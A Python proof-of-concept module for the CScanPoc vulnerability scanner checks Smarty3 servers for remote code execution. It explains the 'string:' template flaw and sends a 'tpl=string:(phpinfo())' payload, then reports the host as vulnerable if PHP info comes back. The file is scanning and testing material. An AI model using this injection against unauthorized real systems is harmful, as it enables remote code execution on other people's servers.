# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Smarty3_0101'  # 平台漏洞编号
    name = 'Smarty3远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2011-10-14'  # 漏洞公布时间
    desc = '''
    模版漏洞描述由于Smarty3中引入了两个特性：
        1、如果display,fetch等方法的模板路径参数接受到的模板文件名是以“string:”或者“eval:”开头的，smarty3就会将此后的字符串值作为模板文件内容，重新编译并执行之。参考连接：http://www.smarty.net/docs/en/template.resources.tpl#templates.from.string
        2、smarty3的模板语言中，可以利用{phpfunction()}等方式直接在smarty tag中执行php表达式。而smarty2中则不支持。参考连接：http://www.smarty.net/docs/en/language.syntax.variables.tpl
    因此，利用以上两个特性相结合，如果用户可以控制模板文件名，即可执行任意php表达式。
    同样的，利用smarty3的resource特性，还可以直接利用“file:”协议直接远程包含任意文件。因为底层是使用fopen函数实现的文件打开，而默认的php配置中，虽然禁止了remote_file_include，但是对于remote_file_open却是允许的。利用这一个特性，让早已消失已久的RFI经典漏洞类型重见天日了。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=2648'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Smarty3'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2b38914e-9406-4709-9868-1ebfafc55775'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/smarty/demo/sv3.php?tpl=string:(phpinfo())"
            url = self.target + payload
            response = requests.get(url)
            if "PHP Version" in response.text and "Configure" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
